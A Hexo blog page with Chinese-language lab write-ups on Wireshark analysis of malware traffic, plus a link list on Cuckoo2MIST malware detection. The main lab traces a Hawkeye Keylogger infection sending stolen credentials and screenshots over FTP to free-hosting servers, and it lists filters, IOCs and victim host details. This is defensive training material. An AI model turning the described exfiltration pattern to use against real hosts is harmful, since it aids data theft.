<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/ytytytytyt6.github.io/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/ytytytytyt6.github.io/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/ytytytytyt6.github.io/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/ytytytytyt6.github.io/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/ytytytytyt6.github.io/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/ytytytytyt6.github.io/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/ytytytytyt6.github.io/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="进一寸有一寸的欢喜">
<meta property="og:type" content="website">
<meta property="og:title" content="思睿&#39;s Blog">
<meta property="og:url" content="https://ytytytytyt6.github.io/page/3/index.html">
<meta property="og:site_name" content="思睿&#39;s Blog">
<meta property="og:description" content="进一寸有一寸的欢喜">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="万俟思睿">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/ytytytytyt6.github.io/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://ytytytytyt6.github.io/page/3/"/>





  <title>思睿's Blog</title>
  








<meta name="generator" content="Hexo 4.2.1"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/ytytytytyt6.github.io/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">思睿's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-archives">
          <a href="/ytytytytyt6.github.io/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ytytytytyt6.github.io/ytytytytyt6.github.io/2020/07/21/cuckoo2mist/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="万俟思睿">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/ytytytytyt6.github.io/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="思睿's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ytytytytyt6.github.io/2020/07/21/cuckoo2mist/" itemprop="url">cuckoo2mist</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-21T08:56:40+08:00">
                2020-07-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<h2 id="Malware-Detection-Using-Machine-Learning-2010年"><a href="#Malware-Detection-Using-Machine-Learning-2010年" class="headerlink" title="Malware Detection Using Machine Learning 2010年"></a>Malware Detection Using Machine Learning 2010年</h2><p>10/2016</p>
<p>Bangalore, India</p>
<ul>
<li>Behavior and Signature based detection of malware using <strong>Cuckoo Sandbox</strong> malware analysis system.</li>
<li><strong>Cuckoo2MIST</strong> used as a features for the training of the models</li>
</ul>
<p><a href="https://bhavdeepsachdeva.com/" target="_blank" rel="noopener">Bhavdeep Singh Sachdeva</a></p>
<p>我们提出了一个多功能的框架，在这个框架中，我们可以使用不同的机器学习算法来成功地区分恶意软件文件和干净的文件，同时尽量减少误报的数量。在本文中，我们首先使用级联单边感知器，然后使用级联核化的单侧感知器来阐述我们框架的思想。在成功地测试了中型恶意软件和干净文件的数据集之后，这个框架背后的思想被提交到一个扩展过程中，使我们能够处理非常大的恶意软件和干净文件的数据集。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20200720162806965.png" alt="img">)<img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="拖曳以移動"> <a href="http://www.osalternative.com/p/cuckoo2mist-alternative-and-similar-open-source-projects-180468.html" target="_blank" rel="noopener">Top 10 cuckoo2mist Alternative and Similar Open Source Projects - Open Source Project Alternative</a></p>
<p><a href="https://zenodo.org/record/10075#.XxVibfj7Tt0" target="_blank" rel="noopener">Malheur: A Tool for Automatic Analysis of Malware Behavior (0.5.4) | Zenodo</a></p>
<p><a href="https://github.com/Navein/Cuckoo2MIST" target="_blank" rel="noopener">Navein/Cuckoo2MIST: MIST (Malware Instruction Set) is a metalanguage representation for monitored behavior of malicious software. Cuckoo2MIST works by converting Cuckoo Sandbox analysis reports into MIST format for data mining and machine learning.</a></p>
<p><a href="https://github.com/M-Gregoire/Cuckoo2Mist" target="_blank" rel="noopener">GitHub - M-Gregoire/Cuckoo2Mist: Module to convert Cuckoo .json to .mist</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ytytytytyt6.github.io/ytytytytyt6.github.io/2020/07/20/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="万俟思睿">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/ytytytytyt6.github.io/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="思睿's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ytytytytyt6.github.io/2020/07/20/hello-world/" itemprop="url">Hello World</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-20T20:48:18+08:00">
                2020-07-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ytytytytyt6.github.io/ytytytytyt6.github.io/2020/07/20/%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E8%AE%AD%E7%BB%83%E4%B8%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="万俟思睿">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/ytytytytyt6.github.io/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="思睿's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ytytytytyt6.github.io/2020/07/20/%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E8%AE%AD%E7%BB%83%E4%B8%80/" itemprop="url">恶意流量分析训练一</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-20T13:10:56+08:00">
                2020-07-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h1><p>本次实验所涉及并要求掌握的知识点。</p>
<hr>
<p>wireshark起还原现场的作用，帮助审计。</p>
<p>Wiki上是这样描述的：对于安全人员而言，网络安全工程师可以使用wireshark来检查讯息安全相关的问题。对于网络安全而言，现场很重要，黑客攻击的过程和服务器被攻击的过程都必须使用网络，wireshark完全可以记录下来，这也正是wireshark强大的地方。</p>
<p>使用wireshark进行恶意流量分析，主要涉及知识点包括<strong>IOC，键盘记录器木马，ftp协议</strong>等。</p>
<blockquote>
<p>入侵指标IOC(Indicatorsof Compromised):[URLs, domains, IP addresses, andSHA256 hashes related to the infection should appear in this section]</p>
</blockquote>
<hr>
<h1 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h1><p>实验所使用的设备名称及规格，网络管理工具简介、版本等。</p>
<hr>
<p>服务器：Windows 7 ，IP地址：随机分配</p>
<p>辅助工具：Wireshark</p>
<h1 id="三、实验内容与实验要求"><a href="#三、实验内容与实验要求" class="headerlink" title="三、实验内容与实验要求"></a>三、实验内容与实验要求</h1><p>实验内容、原理分析及具体实验要求。</p>
<hr>
<blockquote>
<p><strong>实验步骤一</strong></p>
<p><strong>场景</strong></p>
<p>局域网段范围：10.0.0.0/24(10.0.0.0 到 10.0.0.255)</p>
<p>域： beguilesoft.com</p>
<p>域控：10.0.0.10 - BeguileSoft-DC</p>
<p>局域网网关：10.0.0.1</p>
<p>局域网广播地址：10.0.0.255</p>
<p><strong>任务</strong></p>
<p>分析现有的材料，针对受害的windows主机写一份应急报告。建议的模板如下：</p>
<p><strong>总结:</strong></p>
<p>​        在xx时间, 一台window主机被xx感染</p>
<p><strong>细节:</strong></p>
<p>​        IP address:</p>
<p>​        MAC address:</p>
<p>​        Host name:</p>
<p>​        Windows user account name:</p>
<p>入侵指标IOC(Indicatorsof Compromised)：[URLs, domains, IP addresses, andSHA256 hashes related to the infection should appear in this section]</p>
<p>提供了两个压缩文件，分别是告警日志和数据包。</p>
</blockquote>
<blockquote>
<p>实验步骤二</p>
<p>​      那么攻击者究竟拿到了什么数据呢？我们使用ftp-data看看他通过ftp传送了什么</p>
</blockquote>
<blockquote>
<p>实验步骤三</p>
<p>应急报告现在还缺少IOC，所以我们需要整理下，需要整理出目标端口，ip等</p>
<p>在这之前，我们需要先回顾下ftp协议，ftp协议用两个端口实现，分别是数据端口和命令端口。命令端口用于连接，数据端口用于传输数据。</p>
<p>​      命令端口一般都是21。那么数据端口呢？这里又引入了主动模式（PORT）和被动模式（PASV）的概念。当客户端通知服务器它处于被动模式时才会启用，其标志就是客户端给服务端发送了一个PASV.</p>
<p>​      主动模式：</p>
<h1 id=""><a href="#" class="headerlink" title=""></a><img src="http://www.hetianlab.com/headImg.action?guideImg=/3dd647e9-8e45-4905-b820-e99c12a51f36.jpg" alt="img"></h1><p>​      在第1步中，客户端的命令端口与FTP服务器的命令端口建立连接，并发送命令“PORT 1027”。然后在第2步中，FTP服务器给客户端的命令端口返回一个”ACK”。在第3步中，FTP服务器发起一个从它自己的数据端口（20）到客户端先前指定的数据端口（1027）的连接，最后客户端在第4步中给服务器端返回一个”ACK”。</p>
<p>  被动模式：</p>
<h1 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="http://www.hetianlab.com/headImg.action?guideImg=/59e76a29-8149-401f-a493-50b0520f2a86.jpg" alt="img"></h1><p>​      在第1步中，客户端的命令端口与服务器的命令端口建立连接，并发送命令“PASV”。然后在第2步中，服务器返回命令”PORT 2024”，告诉客户端（服务器）用哪个端口侦听数据连接。在第3步中，客户端初始化一个从自己的数据端口到服务器端指定的数据端口的数据连接。最后服务器在第4 步中给客户端的数据端口返回一个”ACK”响应。</p>
<p>​      简单地说，就是，在主动模式下一般默认的数据端口为20，在被动模式下数据端口就不一定了。</p>
</blockquote>
<hr>
<hr>
<h1 id="四、实验过程与分析"><a href="#四、实验过程与分析" class="headerlink" title="四、实验过程与分析"></a>四、实验过程与分析</h1><p>根据具体实验，记录、整理相应命令、运行结果等，包括截图和文字说明。</p>
<p>详细记录在实验过程中发生的故障和问题，并进行故障分析，说明故障排除的过程及方法。</p>
<p><strong>实验步骤一</strong></p>
<p>使用wireshark打开数据包pcap文件，先看告警日志（alert.jpg）：</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590823528961.png" alt="1590823528961"></p>
<p>1.接收到whatismyaddress.com的请求，不能判断是否是恶意软件产生的流量；3.使用了FTP STOR用于存储文件到服务器上，连接到external network，可推测恶意软件通过ftp协议将数据传输到外网服务器；4.Hawkeye Keylogger的木马，可以检索到相关的分析文章<a href="https://www.freebuf.com/column/157857.html。涉及到ftp协议，因此使用ftp过滤查看：" target="_blank" rel="noopener">https://www.freebuf.com/column/157857.html。涉及到ftp协议，因此使用ftp过滤查看：</a></p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590825324591.png" alt="1590825324591"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FTP	Response: 220 ProFTPD Server (000webhost.com) [::ffff:145.14.144.10]</span><br></pre></td></tr></table></figure>

<p>显示的是proftpd，一款很常用的ftp服务端软件，后面 (000webhost.com)[::ffff:145.14.144.10]进入查看，一家免费的虚拟主机商。</p>
<p>使用ftp 关键字过滤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp.request.command eq USER or ftp.request.command eq PASS or ftp.request.command eq STOR</span><br></pre></td></tr></table></figure>

<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590825362266.png" alt="1590825362266">可以发现目标地址在变化，攻击者用的是免费的虚拟主机，比如000webhost。如果更新页面或者传送数据则有可能会导致自动更换ip。</p>
<p><strong>实验步骤二</strong></p>
<p>ftp-data</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590824626760.png" alt="1590824626760"></p>
<p>追踪流</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590825226631.png" alt="1590825226631"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">可以看到系统信息被获取到了，包括：</span><br><span class="line">​      主机名：BREAUX-WIN7-PC</span><br><span class="line">​      用户名：Adriana.breaux</span><br><span class="line">​      MAC地址：84:8f:69:09:86:c0</span><br><span class="line">​      Ip地址：10.0.0.227</span><br><span class="line">还有谷歌等网站的账号、密码都被攻击者获取到了，我们注意到还有一部分的流量显示的是jpeg，推测可能是主机截屏的图我们注意到还有一部分的流量显示的是jpeg，推测可能是主机截屏的图片</span><br></pre></td></tr></table></figure>

<p>选择jpeg 追踪流 显示 保存 另存为png格式</p>
<p><strong>实验步骤三</strong></p>
<p>在wireshark中要想把完整的ftp协议过滤出来需要使用 ftp-data or ftp,只用单个的话只能过滤出ftp命令端口的流量或数据端口的流量，是不完整的</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590825445417.png" alt="1590825445417"></p>
<p>715——状态码220表示对新用户的服务已经准备好</p>
<p>716,719可以看到受害者机器通过用户名密码连入ftp服务端</p>
<p>一直到734条可以看到受害者机器向145.14.145.4发出PASV,前面提到，发出PASV,就说明后面的数据传输过程中服务端使用的端口就不是20了。</p>
<p> 在715到744之间都是命令端口通信的流量。所以此时的IOC是</p>
<p>​      </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ip:145.14.145.4  port:21  url:000.webhost.com</span><br></pre></td></tr></table></figure>

<p>745开始是通过被动模式连接后进行数据传输了</p>
<p>755为例查看：</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590825559834.png" alt="1590825559834"></p>
<p>目标端口为37280，即此时的145.14.145.4使用的端口</p>
<p>所以第二条IOC为 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ip:145.14.145.4  port:37280  url:000webhost.com</span><br></pre></td></tr></table></figure>

<p>分析第二个外网地址——145.14.144.10[从839开始]</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590825693354.png" alt="1590825693354"></p>
<p>858的时候pasv。</p>
<p>命令端口的通信流量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ip:145.14.144.10  port:21  000webhost.com</span><br></pre></td></tr></table></figure>

<p> 数据端口的通信流量以867为例</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590825799304.png" alt="1590825799304"></p>
<p>得到IOC:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ip:145.14.144.10  port:40651  url:000webhost.com</span><br></pre></td></tr></table></figure>

<p>​      从887开始又一次建立数据传输，端口47434</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590825843592.png" alt="1590825843592"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ip:145.14.144.10 port:47434 url:000webhost.com</span><br></pre></td></tr></table></figure>

<p>第三个外网地址分析：从5259开始</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1590825977425.png" alt="1590825977425"></p>
<p>5278出现pasv。 可得两条IOC:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ip:145.14.145.99  port:21  url:000webhost.com</span><br><span class="line">Ip:145.14.145.99 port:36091 url:000webhost.com</span><br></pre></td></tr></table></figure>

<p> 5309开始又建立了一次数据传输，数据端口为35396，IOC为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ip:145.14.145.99  port:35396  url:000webhost.com</span><br></pre></td></tr></table></figure>



<h1 id="五、实验结果总结"><a href="#五、实验结果总结" class="headerlink" title="五、实验结果总结"></a>五、实验结果总结</h1><p>对实验结果进行分析，完成思考题目，总结实验的心得体会，并提出实验的改进意见。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1）在2019年5月2日21点36分，Adriana.breaux的windows主机被Hawkeye Keylogger恶意软件感染。</span><br><span class="line">2）细节：</span><br><span class="line">​      主机名：BREAUX-WIN7-PC</span><br><span class="line">​      用户名：Adriana.breaux</span><br><span class="line">​      MAC地址：84:8f:69:09:86:c0</span><br><span class="line">​      Ip地址：10.0.0.227</span><br><span class="line">3）IOC:</span><br><span class="line">​      Ip:145.14.145.4   port:21         url:000.webhost.com</span><br><span class="line">​      Ip:145.14.145.4   port:37280   url:000webhost.com</span><br><span class="line">​      Ip:145.14.144.10 port:21         url:000webhost.com</span><br><span class="line">​      Ip:145.14.144.10 port:40651   url:000webhost.com</span><br><span class="line">​      Ip:145.14.144.10 port:47434    url:000webhost.com</span><br><span class="line">​      Ip:145.14.145.99 port:21         url:000webhost.com</span><br><span class="line">​      Ip:145.14.145.99 port:36091   url:000webhost.com</span><br><span class="line">​      Ip:145.14.145.99 port:35396   url:000webhost.com。</span><br></pre></td></tr></table></figure>



<hr>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ytytytytyt6.github.io/ytytytytyt6.github.io/2020/07/20/%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E8%AE%AD%E7%BB%83%E4%B8%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="万俟思睿">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/ytytytytyt6.github.io/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="思睿's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/ytytytytyt6.github.io/2020/07/20/%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E8%AE%AD%E7%BB%83%E4%B8%89/" itemprop="url">恶意流量分析训练三</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-20T13:10:56+08:00">
                2020-07-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>一、实验目的</p>
<p>本次实验所涉及并要求掌握的知识点。</p>
<hr>
<p>通过该实验了解使用wireshark进行恶意流量分析，培养流量分析的思维和能力，本次实验涉及知识包括<strong>善用搜索引擎、技术分析文章整合、snort日志分析、以及关于Lockyransomware和Angler EK部分攻击流量特征。</strong></p>
<hr>
<h1 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h1><p>实验所使用的设备名称及规格，网络管理工具简介、版本等。</p>
<hr>
<p>服务器：Windows 7 ，IP地址：随机分配</p>
<p>辅助工具：Wireshark</p>
<hr>
<h1 id="三、实验内容与实验要求"><a href="#三、实验内容与实验要求" class="headerlink" title="三、实验内容与实验要求"></a>三、实验内容与实验要求</h1><p>实验内容、原理分析及具体实验要求。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">试根据给出的数据包等文件，分析解答如下问题</span><br><span class="line"></span><br><span class="line">       Q1；用户的姓名？</span><br><span class="line">       Q2：用户windows机器的主机名？</span><br><span class="line">       Q3；用户windows主机的ip地址？</span><br><span class="line">       Q4；用户电脑的mac地址？</span><br><span class="line">       Q5；用户被感染了哪些恶意文件？</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="四、实验过程与分析"><a href="#四、实验过程与分析" class="headerlink" title="四、实验过程与分析"></a>四、实验过程与分析</h1><p>根据具体实验，记录、整理相应命令、运行结果等，包括截图和文字说明。</p>
<p>详细记录在实验过程中发生的故障和问题，并进行故障分析，说明故障排除的过程及方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Q1；用户的姓名？</span><br><span class="line">Q2：用户windows机器的主机名？</span><br><span class="line">Q3；用户windows主机的ip地址？</span><br><span class="line">Q4；用户电脑的mac地址？</span><br></pre></td></tr></table></figure>

<p>统计找到10.0.21.136</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1591014527454.png" alt="1591014527454"></p>
<p>如何找主机名？——</p>
<blockquote>
<p>NetBIOS是Network Basic Input/Output System的简称，一般指用于局域网通信的一套API，它在基于 NetBIOS 名称访问的网络上提供主机名和地址映射方法。所以通过NBNS协议我们可以找到主机名</p>
</blockquote>
<p>mac地址及主机名如下</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1591014670680.png" alt="1591014670680"></p>
<p>如何找用户名？</p>
<blockquote>
<p>在电脑自带的通信过程中，一般人是不会设置完整的姓名的，题目既然这么问说明要从其他地方入手，比如用户在网站注册，或者他的邮件的名字，都有可能是姓名，所以我们尝试过滤出http请求数据。</p>
</blockquote>
<p>出现signup 追踪流 发现</p>
<p><img src="C:%5CUsers%5Clenovo%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1591014808751.png" alt="1591014808751"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Q5；用户被感染了哪些恶意文件？</span><br></pre></td></tr></table></figure>

<p>  可以看到在用户注册之后，紧接着是google analytics,这是Google开发的网站流量跟踪工具。</p>
